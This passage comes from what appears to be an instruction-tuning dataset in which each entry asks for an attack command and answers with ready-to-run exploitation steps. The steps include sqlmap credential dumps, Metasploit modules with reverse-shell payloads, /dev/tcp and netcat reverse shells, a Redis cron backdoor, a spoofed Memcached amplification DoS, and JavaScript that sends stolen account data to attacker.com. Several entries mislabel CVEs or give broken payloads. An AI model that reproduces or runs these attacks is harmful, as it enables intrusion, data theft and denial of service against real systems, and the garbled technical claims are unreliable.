  },
  {
    "instruction": "Generate a two-step chain using business logic flaw to bypass payment verification.",
    "input": "Finding 1: Shopping cart at https://ecom.com/cart allows negative quantities. Finding 2: Order confirmation processes without re-validating total.",
    "output": "Step 1️⃣ — Manipulate Cart\nIntercept the add-to-cart request and set quantity to -1 for a high-value item to credit the account.\n\nStep 2️⃣ — Chain to Free Order\nPlace an order for another item; the negative credit offsets the cost to zero.\n\nStep 3️⃣ — Execute Attack\nUse Burp Repeater: First request with qty=-1, then order request.\n```http\n# Add negative\nPOST /cart/add HTTP/1.1\n... qty: -1 item_id: 999\n\n# Then order\nPOST /order/confirm HTTP/1.1\n...\n```\nResult: Free item shipped due to unvalidated logic."
  },
  {
    "instruction": "Provide the sqlmap command to dump credentials from the union-based SQL injection.",
    "input": "Finding: Union-based SQLi in 'cat' parameter at http://news.com/article.php?cat=1, MySQL backend with users table.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnion SQLi allows stacking queries to extract data from other tables like user credentials.\n\nStep 2️⃣ — Formulate Dump Command\nUse --dump with table specification to extract usernames and passwords.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"http://news.com/article.php?cat=1\" -p cat --dbms=mysql --technique=U --dump -D security -T users --dump-all\n```"
  },
  {
    "instruction": "Assuming shell access, provide commands to exploit the SUID binary misconfiguration for root shell.",
    "input": "LinPEAS enum: /usr/local/bin/editor SUID bit set, vulnerable to env PATH hijacking for arbitrary command execution.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nSUID binaries run with owner privileges; PATH hijack tricks it into running system commands as root.\n\nStep 2️⃣ — Craft Hijack\nCreate a fake 'vi' in a controlled dir that spawns root shell, prepend to PATH.\n\nStep 3️⃣ — Execute Attack\n```bash\nmkdir /tmp/hijack; echo -e '#!/bin/bash\ncp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh; /tmp/rootsh -p' > /tmp/hijack/vi; chmod +x /tmp/hijack/vi\nPATH=/tmp/hijack:$PATH /usr/local/bin/editor\n# In editor, it runs vi but hijacks to shell\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the ProxyShell vulnerability chain for initial access.",
    "input": "Exchange scan on target mail.company.com: Vulnerable to ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-26855) allowing RCE via Outlook Web App.",
    "output": "Step 1️⃣ — Identify Vulnerability\nProxyShell chains three flaws in Exchange to enable unauthenticated RCE, often leading to web shell deployment.\n\nStep 2️⃣ — Formulate Exploit Chain\nUse the ProxyShell module which automates the chain: autodiscover, privilege escalation, and SSRF to RCE.\n\nStep 3️⃣ — Execute Attack\nRun msfconsole with the module configured for the target and reverse shell payload.\n```bash\nmsfconsole -q -x \"use exploit/windows/http/exchange_proxyshell; set RHOSTS mail.company.com; set RPORT 443; set SSL true; set LHOST <YOUR_IP>; set PAYLOAD windows/x64/meterpreter/reverse_https; exploit\"\n```"
  },
  {
    "instruction": "Provide the sqlmap command to exploit the SQL injection in MOVEit Transfer for database dump.",
    "input": "Finding: SQL injection in file download parameter at https://moveit.company.com/guest/user/file, Progress MOVEit Transfer version 2021.0.6, SQL Server backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauthenticated SQLi in MOVEit allows extracting database contents, including user credentials and files metadata.\n\nStep 2️⃣ — Formulate sqlmap Command\nTarget the vulnerable parameter with --dump to extract tables like users and audit logs.\n\nStep 3️⃣ — Execute Attack\n```bash\nsqlmap -u \"https://moveit.company.com/guest/user/file?folder=%2F&filename=FUZZ\" --batch --dbms=mssql --technique=T --dump-all -D MOVEitTransfer\n```"
  },
  {
    "instruction": "Generate the curl command sequence to exploit the Citrix ADC buffer overflow for RCE.",
    "input": "Nmap script on target 10.10.10.10: Citrix ADC Gateway 12.1 vulnerable to CVE-2019-19781, allowing unauth RCE via crafted HTTP requests.",
    "output": "Step 1️⃣ — Identify Vulnerability\nBuffer overflow in Citrix ADC's VPN portal enables arbitrary code execution without authentication.\n\nStep 2️⃣ — Craft Exploit Payload\nUse a known PoC payload in the nsroot parameter to trigger overflow and execute commands.\n\nStep 3️⃣ — Execute Attack\nSend the malicious request via curl; monitor for command output in response.\n```bash\ncurl -k -H 'User-Agent: () { :; }; echo; /bin/cat /etc/passwd' 'https://10.10.10.10/vpn/../vpns/portal/../script.sh' -d 'cmd=whoami'\n```"
  },
  {
    "instruction": "Provide the commands to exploit the F5 BIG-IP iControl REST unauthenticated access for shell.",
    "input": "Finding: F5 BIG-IP 13.1.0 exposed on https://loadbalancer.com:8443/mgmt/tm/util/unix-ls, no auth required for iControl REST API.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauthenticated access to iControl allows executing system commands via the unix-ls endpoint.\n\nStep 2️⃣ — Formulate Command Injection\nUse the 'command' parameter in unix-ls to run arbitrary bash commands, chaining to reverse shell.\n\nStep 3️⃣ — Execute Attack\nListener: `nc -lvnp 2222`. Then curl the payload.\n```bash\ncurl -k -u admin:x 'https://loadbalancer.com:8443/mgmt/tm/util/unix-ls' -d '{ \"command\":\"run\",\"utilCmdArgs\": \"-c 'bash -i >& /dev/tcp/<YOUR_IP>/2222 0>&1'\" }' -H 'Content-Type: application/json'\n```"
  },
  {
    "instruction": "Generate the curl command to exploit the Jenkins Script Console RCE without credentials.",
    "input": "Finding: Jenkins 2.235 on http://ci.dev:8080/script vulnerable to unauth access to Groovy script console, allowing code execution.",
    "output": "Step 1️⃣ — Identify Vulnerability\nExposed Script Console permits running arbitrary Groovy code, leading to system-level RCE.\n\nStep 2️⃣ — Craft Groovy Payload\nInject a script that downloads and executes a reverse shell from an external host.\n\nStep 3️⃣ — Execute Attack\nDirectly POST the Groovy code to the console endpoint. Listener: `nc -lvnp 3333`.\n```bash\ncurl -X POST -d 'groovy=def sout = new StringBuilder(); def soutw = new StringWriter(); def ps = new ProcessBuilder(\"/bin/bash\", \"-c\", \"bash -i >& /dev/tcp/<YOUR_IP>/3333 0>&1\"); ps.redirectErrorStream(true); def proc = ps.start(); proc.inputStream.eachLine { sout.append(it + \"\n\"); soutw.append(it + \"\n\"); }; sout.toString()' http://ci.dev:8080/script\n```"
  },
  {
    "instruction": "Provide the curl commands to exploit unauthenticated Elasticsearch for data dump and index creation.",
    "input": "Port scan: Elasticsearch 6.8 on 192.168.1.200:9200 without security, _cat/indices and _search endpoints accessible.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauthenticated ES allows full CRUD on indices, enabling data theft or malicious data injection.\n\nStep 2️⃣ — Formulate Enumeration and Dump\nFirst list indices, then dump documents from sensitive ones like logs or users.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl '192.168.1.200:9200/_cat/indices?v'\ncurl -X GET '192.168.1.200:9200/bank/_search?pretty' -H 'Content-Type: application/json' -d '{\"query\": {\"match_all\": {}}}' -o es_dump.json\n```"
  },
  {
    "instruction": "Generate the commands to exploit unauthenticated MongoDB for admin shell and data exfil.",
    "input": "Finding: MongoDB 4.0 on mongodb://db.server.com:27017 without auth, accessible via mongo shell.",
    "output": "Step 1️⃣ — Identify Vulnerability\nNo auth on MongoDB exposes all databases for read/write, including user creation with admin roles.\n\nStep 2️⃣ — Gain Admin Access\nConnect and switch to admin db to create a user, then authenticate for full control.\n\nStep 3️⃣ — Execute Attack\n```bash\nmongo mongodb://db.server.com:27017/admin -u '' -p ''\nuse admin\ndb.createUser({user: \"attacker\", pwd: \"pass\", roles: [\"root\"]})\n# Reconnect: mongo -u attacker -p pass --authenticationDatabase admin\n# Dump: db.getSiblingDB('users').find().forEach(printjson);\n```"
  },
  {
    "instruction": "Provide the Redis commands to exploit unauthenticated access for persistence and RCE.",
    "input": "Telnet scan: Redis 5.0 on 10.0.0.50:6379 no auth, config shows no protected-mode.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth Redis allows writing to disk via CONFIG SET dir and module loading for RCE.\n\nStep 2️⃣ — Craft Persistence\nWrite a cron job to the disk for backdoor, or load a malicious module.\n\nStep 3️⃣ — Execute Attack\nConnect via redis-cli and run:\n```bash\nredis-cli -h 10.0.0.50\n> CONFIG SET dir /var/spool/cron/\n> CONFIG SET dbfilename root\n> SET 1 \"\n* * * * * bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1\n\"\n> SAVE\n# Triggers cron write\n```"
  },
  {
    "instruction": "Generate the amplification command for Memcached unauthenticated DoS attack.",
    "input": "Scan: Memcached 1.5.6 on udp/11211 public IP 203.0.113.1, no ACLs, vulnerable to reflection amplification.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnauth Memcached UDP allows massive amplification by spoofing source IP in GET requests.\n\nStep 2️⃣ — Formulate Amplification\nUse hping3 or Scapy to craft spoofed UDP packets with stats command for ~50k amplification factor.\n\nStep 3️⃣ — Execute Attack\nTarget victim IP with spoofed source:\n```bash\nhping3 --udp -p 11211 --sign 0xdeadbeef --data 'stats\r\n' --spoof <VICTIM_IP> 203.0.113.1 -c 1000\n```"
  },
  {
    "instruction": "Provide the curl command to exploit WebDAV PROPFIND for directory listing and file access.",
    "input": "Finding: WebDAV enabled on https://webdav.site.com/ without auth, PROPFIND returns full dir structure.",
    "output": "Step 1️⃣ — Identify Vulnerability\nMisconfigured WebDAV exposes file system via methods like PROPFIND, allowing unauth browsing and uploads.\n\nStep 2️⃣ — Formulate Enumeration\nUse PROPFIND with depth header to list directories and files recursively.\n\nStep 3️⃣ — Execute Attack\n```bash\ncurl -X PROPFIND https://webdav.site.com/ -H 'Depth: infinity' -u '' '' -o webdav_listing.xml\n# Parse XML for files, then GET: curl https://webdav.site.com/sensitive.txt -o stolen.txt\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the Atlassian Confluence OGNL injection for RCE.",
    "input": "Scan finding on target https://confluence.company.com:8090: Confluence Server 6.13.3 vulnerable to CVE-2021-26084, allowing unauthenticated OGNL injection in template parameters.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOGNL injection in Confluence templates enables arbitrary Java code execution without authentication.\n\nStep 2️⃣ — Formulate Exploit\nUse the dedicated Metasploit module to inject a payload via the atlassian-gadgets plugin endpoint.\n\nStep 3️⃣ — Execute Attack\nLaunch with reverse shell configuration.\n```bash\nmsfconsole -q -x \"use exploit/multi/http/atlassian_confluence_ognl_rce; set RHOSTS confluence.company.com; set RPORT 8090; set SSL false; set LHOST <YOUR_IP>; set PAYLOAD java/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the Apache HTTP Server chunked request smuggling for request hijacking.",
    "input": "Finding: Apache 2.4.49 on http://webserver.com vulnerable to CVE-2021-41773, allowing path traversal and smuggling via malformed chunked encoding.",
    "output": "Step 1️⃣ — Identify Vulnerability\nChunked smuggling exploits transfer-encoding differences to hijack requests or traverse paths.\n\nStep 2️⃣ — Craft Smuggling Payload\nUse a CL.TE mismatch to smuggle a malicious request after a benign one.\n\nStep 3️⃣ — Execute Attack\nSend via curl with --data-binary to preserve chunks; observe hijacked response.\n```bash\ncurl -X POST http://webserver.com/post -H 'Transfer-Encoding: chunked' --data-binary $'0\r\n\r\n5\r\nadmin\r\n0\r\n\r\nGET /../../../etc/passwd HTTP/1.1\r\nHost: webserver.com\r\n\r\n' -v\n```"
  },
  {
    "instruction": "Generate the command sequence to exploit the Oracle WebLogic RCE via IIOP deserialization.",
    "input": "Nmap script on target 192.168.86.1:7001: WebLogic 10.3.6 vulnerable to CVE-2015-4852, exposing IIOP port for unauth deserialization RCE.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIIOP deserialization in WebLogic allows sending malicious serialized objects for code execution.\n\nStep 2️⃣ — Prepare ysoserial Payload\nGenerate a JRMPListener payload for reverse shell.\n\nStep 3️⃣ — Execute Attack\nUse serialtc.py to send the payload over IIOP. Listener: `nc -lvnp 5555`.\n```bash\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener <YOUR_IP> 1099 CommonsCollections1 'bash -i >& /dev/tcp/<YOUR_IP>/5555 0>&1' &\npython3 serialtc.py -r <YOUR_IP> -p 1099 -T 'jr1' -i <PAYLOAD_FILE> -e 'iiop://192.168.86.1:7001'\n```"
  },
  {
    "instruction": "Provide the steps and curl commands to exploit the Insecure Direct Object Reference in user profile access.",
    "input": "Burp finding on https://hr.system.com/api/profile/123: IDOR allows accessing any user's profile by changing the numeric ID without auth checks.",
    "output": "Step 1️⃣ — Identify Vulnerability\nIDOR exposes sensitive user data like PII or credentials by manipulating object identifiers.\n\nStep 2️⃣ — Enumerate IDs\nStart with known ID, increment to access others' data.\n\nStep 3️⃣ — Execute Attack\nUse curl loop or manually; example for ID 456:\n```bash\nfor id in {100..500}; do curl -H 'Authorization: Bearer <YOUR_TOKEN>' \"https://hr.system.com/api/profile/$id\" | jq '.data.name'; done\ncurl -H 'Authorization: Bearer <YOUR_TOKEN>' https://hr.system.com/api/profile/456\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the SMBGhost vulnerability for remote code execution.",
    "input": "SMB scan on Windows target 10.10.20.30: SMBv3 compression (CVE-2020-0796) enabled, vulnerable to buffer overflow in srzip decompression.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSMBGhost allows unauth RCE via crafted compressed packets exploiting decompression flaws.\n\nStep 2️⃣ — Configure Module\nUse the scanner to confirm, then exploit with shell payload.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/windows/smb/smbghost; set RHOSTS 10.10.20.30; set LHOST <YOUR_IP>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the Python script to exploit the Race Condition in token renewal for account takeover.",
    "input": "Finding: API at https://auth.service.com/renew has race condition; multiple concurrent renew requests can generate duplicate valid tokens for the same user.",
    "output": "Step 1️⃣ — Identify Vulnerability\nRace condition in token handling allows bypassing expiration by parallel requests.\n\nStep 2️⃣ — Craft Concurrent Requests\nUse threading to send multiple renews simultaneously.\n\nStep 3️⃣ — Execute Attack\nSave as race.py and run `python3 race.py`.\n```python\nimport requests, threading\nurl = 'https://auth.service.com/renew'\ntokens = []\ndef renew():\n    r = requests.post(url, headers={'Authorization': 'Bearer <EXPIRED_TOKEN>'}, json={'user_id': 123})\n    if r.status_code == 200:\n        tokens.append(r.json()['new_token'])\nthreads = [threading.Thread(target=renew) for _ in range(10)]\nfor t in threads: t.start()\nfor t in threads: t.join()\nprint(set(tokens))  # Collect unique tokens\n```"
  },
  {
    "instruction": "Generate the command to use sqlmap for out-of-band SQL injection exfiltration via DNS.",
    "input": "Finding: Out-of-band SQLi in 'product' parameter at http://ecom.com/cart.php?product=1, MySQL with DNS resolution enabled.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOOB SQLi uses external channels like DNS for data exfil when direct responses are blind.\n\nStep 2️⃣ — Formulate sqlmap\nUse --dns-domain to trigger DNS queries for each character dumped.\n\nStep 3️⃣ — Execute Attack\nMonitor DNS logs on your domain for exfil data.\n```bash\nsqlmap -u \"http://ecom.com/cart.php?product=1\" -p product --dbms=mysql --technique=B --dns-domain=attacker.com --dump -D shop -T users --dump-all\n```"
  },
  {
    "instruction": "Provide the commands to exploit the weak session cookie for session fixation attack.",
    "input": "Finding: Site http://forum.com sets session ID via query param /login?session=abc123, no regeneration on auth.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSession fixation allows attacker to pre-set SID, hijacking session post-login.\n\nStep 2️⃣ — Fixate and Hijack\nSet SID via link, wait for user login, then use the fixed SID.\n\nStep 3️⃣ — Execute Attack\nPhish with fixed link, then access with SID.\n```bash\n# Phish link: http://forum.com/login?session=attacker123\n# After login, curl with cookie\ncurl -b 'PHPSESSID=attacker123' http://forum.com/profile -o hijacked_profile.html\n```"
  },
  {
    "instruction": "Generate a two-step chain using XML External Entity injection to SSRF and port scan.",
    "input": "Finding 1: XXE in /upload XML POST at https://parser.com/api. Finding 2: Server allows outbound connections to internal 127.0.0.1:22.",
    "output": "Step 1️⃣ — Confirm XXE to SSRF\nUse XXE to resolve internal URLs, confirming SSRF capability.\n\nStep 2️⃣ — Chain to Port Scan\nCraft entities for gopher or file:// to probe ports via response size/differences.\n\nStep 3️⃣ — Execute Attack\nSend XXE payload via curl.\n```bash\ncurl -X POST https://parser.com/api -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22/\">]><root>&xxe;</root>' -v\n# For scan: Vary port in entity, check response time/size\n```"
  },
  {
    "instruction": "Assuming foothold, provide commands to exploit the writable /etc/crontab for root persistence.",
    "input": "Post-exploit: Low-priv user can write to /etc/crontab due to misconfigured permissions.",
    "output": "Step 1️⃣ — Identify Privilege Escalation\nWritable crontab allows injecting root-executed commands periodically.\n\nStep 2️⃣ — Inject Backdoor\nAppend a line for reverse shell every minute as root.\n\nStep 3️⃣ — Execute Attack\n```bash\necho '* * * * * root nc -e /bin/sh <YOUR_IP> 7777' >> /etc/crontab\n# Wait 1 min, check listener\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the PrintNightmare vulnerability for privilege escalation.",
    "input": "Post-exploitation on Windows target 192.168.1.100: Print Spooler service vulnerable to CVE-2021-34527, allowing arbitrary DLL loading as SYSTEM.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPrintNightmare exploits the Print Spooler to load malicious DLLs with SYSTEM privileges via RPC calls.\n\nStep 2️⃣ — Formulate Exploit\nUse the Metasploit module to upload and trigger a malicious DLL for reverse shell.\n\nStep 3️⃣ — Execute Attack\nFrom msfconsole, configure and run for escalation.\n```bash\nmsfconsole -q -x \"use exploit/windows/local/cve_2021_34527_printerbug; set SESSION <EXISTING_SESSION_ID>; set LHOST <YOUR_IP>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run\"\n```"
  },
  {
    "instruction": "Provide the Impacket command to exploit Zerologon for domain controller compromise.",
    "input": "Finding: Domain Controller 10.0.0.10 running Netlogon vulnerable to CVE-2020-1472, allowing NTLM auth bypass via zeroed NetrServerAuthenticate response.",
    "output": "Step 1️⃣ — Identify Vulnerability\nZerologon enables resetting the DC machine account password, leading to full domain takeover.\n\nStep 2️⃣ — Formulate Attack\nUse zerologon.py to repeatedly call NetrServerAuthenticate with zeros until success, then dump secrets.\n\nStep 3️⃣ — Execute Attack\nRun the script to reset password, then use secretsdump for hashes.\n```bash\npython3 zerologon.py <YOUR_DOMAIN>/<YOUR_USER> 10.0.0.10\npython3 secretsdump.py -system /path/to/SYSTEM -bootkey <BOOTKEY> -hashes <MACHINE_HASH> <DOMAIN>/<MACHINE$>@10.0.0.10\n```"
  },
  {
    "instruction": "Generate the curl command to exploit the Signature Wrap Attack in SOAP services.",
    "input": "Finding: SOAP endpoint at https://api.soap.com/verify uses XML Signature with key info outside signed envelope, allowing signature wrapping for auth bypass.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSignature wrapping inserts malicious actions inside the signed element, bypassing validation.\n\nStep 2️⃣ — Craft Wrapped Payload\nWrap a privileged action within the signed body by duplicating elements.\n\nStep 3️⃣ — Execute Attack\nSend the modified SOAP XML via curl.\n```bash\ncurl -X POST https://api.soap.com/verify -H 'Content-Type: application/soap+xml' -d '<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><ns1:Action xmlns:ns1=\"http://example.com\"><ns1:AdminAction>deleteUser</ns1:AdminAction></ns1:Action></soap:Body></soap:Envelope><!-- Malicious wrapped: <ns1:Action><ns1:AdminAction>transferFunds</ns1:AdminAction></ns1:Action> -->' -v\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure cryptographic storage of passwords in the database.",
    "input": "Database dump from previous access: Passwords stored as reversible XOR-encrypted strings in 'users' table, XOR key 'secretkey' hardcoded in app code.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWeak reversible encryption allows easy decryption of all user passwords using the known key.\n\nStep 2️⃣ — Decrypt Payload\nUse Python to XOR decrypt the stored values.\n\nStep 3️⃣ — Execute Attack\nAssuming dumped CSV, run script to recover plaintext.\n```python\nimport csv\nkey = b'secretkey'\nwith open('users.csv', 'r') as f:\n    reader = csv.DictReader(f)\n    for row in reader:\n        enc_pass = bytes.fromhex(row['password'])\n        dec_pass = ''.join(chr(b ^ key[i % len(key)]) for i, b in enumerate(enc_pass))\n        print(f'User {row[\"username\"]}: {dec_pass}')\n```"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the SaltStack unauthenticated RCE.",
    "input": "Scan on target 192.168.10.50:443: Salt Master 3000.2 vulnerable to CVE-2020-11651/11652, allowing eauth bypass and command execution via salt-api.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSaltStack flaws allow unauth API access to run arbitrary commands on minions.\n\nStep 2️⃣ — Formulate Module\nUse the auxiliary module to bypass eauth and execute via runner commands.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use auxiliary/gather/saltstack_unauth_rce; set RHOSTS 192.168.10.50; set RPORT 443; set SSL true; set TARGETURI /; set CMD 'whoami'; run\"\n```"
  },
  {
    "instruction": "Provide the curl command sequence to exploit the HTTP Request Smuggling via TE.CL bypass.",
    "input": "Finding: Load balancer in front of nginx backend at http://app.com, TE.CL smuggling possible due to mismatched parsing.",
    "output": "Step 1️⃣ — Identify Vulnerability\nRequest smuggling poisons the connection queue, hijacking subsequent requests.\n\nStep 2️⃣ — Craft Smuggling Request\nUse Transfer-Encoding: chunked with invalid CL to desync.\n\nStep 3️⃣ — Execute Attack\nSend prefix then malicious request.\n```bash\n# Prefix request\ncurl -X POST http://app.com/post -H 'Transfer-Encoding: chunked' --data-binary $'0\r\n\r\n' -v\n# Smuggled: curl -X POST http://app.com/post -H 'Content-Length: 4' --data 'GET /admin HTTP/1.1\r\nHost: app.com\r\n\r\n' -v\n```"
  },
  {
    "instruction": "Generate the Python script to exploit the insufficient logging for stealthy data exfiltration.",
    "input": "Finding: App at https://data.com/export logs only errors, not data access; endpoint /export?id=1 returns sensitive records without audit.",
    "output": "Step 1️⃣ — Identify Vulnerability\nLack of logging allows undetected bulk data theft over time.\n\nStep 2️⃣ — Automate Exfil\nScript to fetch and save records incrementally, mimicking legitimate traffic.\n\nStep 3️⃣ — Execute Attack\nRun `python3 exfil.py`.\n```python\nimport requests, time\nurl = 'https://data.com/export'\nfor id in range(1, 10000):\n    r = requests.get(f'{url}?id={id}', headers={'User-Agent': 'Mozilla/5.0'})\n    if r.status_code == 200:\n        with open(f'data_{id}.json', 'w') as f:\n            f.write(r.text)\n    time.sleep(0.5)  # Slow to avoid detection\nprint('Exfil complete')\n```"
  },
  {
    "instruction": "Provide the commands to exploit the misconfigured CORS policy for credential theft.",
    "input": "Finding: API at https://api.bank.com/* has CORS with Access-Control-Allow-Origin: *, allowing credentialed requests from any origin.",
    "output": "Step 1️⃣ — Identify Vulnerability\nOverly permissive CORS exposes API to malicious sites, stealing user creds via JS.\n\nStep 2️⃣ — Craft Malicious JS\nUse fetch with credentials: 'include' from evil site to read sensitive data.\n\nStep 3️⃣ — Execute Attack\nHost HTML on evil.com:\n```html\n<script>fetch('https://api.bank.com/account', {credentials: 'include'}).then(r => r.json()).then(d => fetch('http://attacker.com/steal?data='+encodeURIComponent(JSON.stringify(d))));</script>\n```\nPhish user to visit evil.com while logged in."
  },
  {
    "instruction": "Generate a two-step attack chain using broken access control to escalate from user to admin.",
    "input": "Finding 1: /user/profile accessible with user token. Finding 2: Same endpoint /admin/profile with admin actions if role=admin in header.",
    "output": "Step 1️⃣ — Intercept User Request\nCapture a legitimate user API call and note the role header.\n\nStep 2️⃣ — Modify for Escalation\nChange the role to 'admin' and replay to access privileged functions.\n\nStep 3️⃣ — Execute Attack\nUse Burp or curl:\n```bash\ncurl -H 'Authorization: Bearer <USER_TOKEN>' -H 'X-Role: admin' https://app.com/admin/profile -X POST -d '{\"action\":\"delete_all\"}'\n```"
  },
  {
    "instruction": "Provide the sqlmap command to exploit the second-order SQL injection for delayed execution.",
    "input": "Finding: Second-order SQLi in user registration 'username' field at https://reg.com/signup, stored and executed later in admin search query, PostgreSQL backend.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSecond-order SQLi triggers on later queries, evading direct detection.\n\nStep 2️⃣ — Formulate Delayed Payload\nRegister with payload that injects when admin searches the username.\n\nStep 3️⃣ — Execute Attack\nFirst register, trigger via admin simulation if possible; use sqlmap for --second-order.\n```bash\nsqlmap --url=\"https://reg.com/signup\" --data=\"username=admin&email=test@test.com\" --second-order=\"https://reg.com/admin/search?query=admin\" -p username --dbms=postgresql --os-shell\n```"
  },
  {
    "instruction": "Generate the command to exploit the unencrypted sensitive data in transit using MITM.",
    "input": "Wireshark capture on network: HTTP traffic between app and backend at 10.1.1.20:8080 leaks API keys in plaintext POST bodies.",
    "output": "Step 1️⃣ — Identify Vulnerability\nUnencrypted HTTP exposes sensitive data like keys to interception via MITM attacks.\n\nStep 2️⃣ — Set Up MITM\nUse Bettercap or Ettercap to ARP spoof and intercept traffic on the network segment.\n\nStep 3️⃣ — Execute Attack\nPosition as MITM, then capture and extract keys from POST requests.\n```bash\n# ARP spoof: bettercap -iface eth0 -caplet http-ui\n# Or manual: arpspoof -i eth0 -t 10.1.1.20 -r <GATEWAY_IP>\narpspoof -i eth0 -t <GATEWAY_IP> -r 10.1.1.20\n# Sniff with Wireshark or tcpdump: tcpdump -i eth0 -A -s 0 port 8080 | grep -i key\n```"
  },
  {
    "instruction": "Provide the steps and curl command to exploit the missing CSRF protection on the password change form.",
    "input": "Finding: Password change at https://user.com/change-pw lacks CSRF token; form POST to /update-pw with old_pw, new_pw fields.",
    "output": "Step 1️⃣ — Identify Vulnerability\nAbsent CSRF tokens allow malicious sites to submit forms on behalf of logged-in users.\n\nStep 2️⃣ — Craft CSRF PoC\nCreate an HTML form that auto-posts the change to a victim-controlled new password.\n\nStep 3️⃣ — Execute Attack\nHost HTML and phish the victim while logged in. Example form:\n```html\n<html><body onload='document.forms[0].submit()'><form action='https://user.com/update-pw' method='POST'><input type='hidden' name='old_pw' value='victim_old'><input type='hidden' name='new_pw' value='attacker123'><input type='submit'></form></body></html>\n```\nOr test with curl: `curl -X POST -d 'old_pw=victim_old&new_pw=attacker123' -b 'session=<VICTIM_COOKIE>' https://user.com/update-pw`"
  },
  {
    "instruction": "Generate the Metasploit command to exploit the vBulletin SQL injection for forum takeover.",
    "input": "Scan on https://forum.com: vBulletin 5.6.0 vulnerable to CVE-2019-16759, unauth SQLi in widgetconfig.php.",
    "output": "Step 1️⃣ — Identify Vulnerability\nSQLi in vBulletin allows unauth DB access, user creation, or command execution on MySQL backend.\n\nStep 2️⃣ — Formulate Module\nUse the vBulletin module to inject and escalate to shell.\n\nStep 3️⃣ — Execute Attack\n```bash\nmsfconsole -q -x \"use exploit/unix/webapp/vbulletin_widgetconfig_code_exec; set RHOSTS forum.com; set RPORT 80; set LHOST <YOUR_IP>; set PAYLOAD php/meterpreter/reverse_tcp; exploit\"\n```"
  },
  {
    "instruction": "Provide the commands to exploit the insecure file permissions on shared storage for data tampering.",
    "input": "Post-access enum: /shared/uploads directory on Linux server world-writable, used for profile images but allows overwriting system configs.",
    "output": "Step 1️⃣ — Identify Vulnerability\nWorld-writable dirs allow unauthorized file replacement, potentially overwriting critical configs.\n\nStep 2️⃣ — Craft Tamper Payload\nUpload a malicious file mimicking a legit one, targeting a config like /etc/hosts via symlink.\n\nStep 3️⃣ — Execute Attack\nFrom shell or upload form:\n```bash\nln -s /etc/hosts /shared/uploads/victim.jpg\n# Then edit: echo '127.0.0.1 badsite.com' > /shared/uploads/victim.jpg\n# App serves/uses it, tampering system\n```"
  },
  {
    "instruction": "Generate the Python script to exploit the predictable session ID generation for hijacking.",
    "input": "Finding: Session IDs at http://app.com generated as timestamp-based hex, predictable from user ID and time.",
    "output": "Step 1️⃣ — Identify Vulnerability\nPredictable SIDs allow guessing valid sessions for user impersonation.\n\nStep 2️⃣ — Predict and Hijack\nScript to generate possible SIDs based on pattern and test.\n\nStep 3️⃣ — Execute Attack\nRun `python3 predict_sid.py`.\n```python\nimport requests, time\nbase = int(time.time())\nuser_id = 123\nfor offset in range(-60, 60):\n    sid = f'{base + offset:010x}{user_id:04x}'\n    r = requests.get('http://app.com/profile', cookies={'SID': sid})\n    if 'Welcome, User' in r.text:\n        print(f'Valid SID: {sid}')\n        break\n```"
  },
  {
    "instruction": "Provide the curl command to exploit the open GraphQL endpoint for introspection and mutation abuse.",
    "input": "Finding: GraphQL at https://api.com/graphql allows introspection query, revealing schema with admin mutations.",
    "output": "Step 1️⃣ — Identify Vulnerability\nEnabled introspection exposes schema, enabling crafting of privilege escalation mutations.\n\nStep 2️⃣ — Introspect and Mutate\nFirst query __schema, then use mutation to elevate role.\n\nStep 3️⃣ — Execute Attack\n```bash\n# Introspect\ncurl -X POST https://api.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name type{name}}}}\"}'\n\n# Mutate (example elevate)\ncurl -X POST https://api.com/graphql -H 'Content-Type: application/json' -d '{\"query\":\"mutation {elevateRole(input: {userId: \\\"123\\\" role: \\\"admin\\\"}) {success}}\", \"variables\":{}}'\n```"
  },
  {
    "instruction": "Generate the command sequence to exploit the weak CAPTCHA implementation for automated account creation.",
    "input": "Finding: Registration at https://site.com/register uses simple math CAPTCHA (2+2=), bypassable by solving in script.",
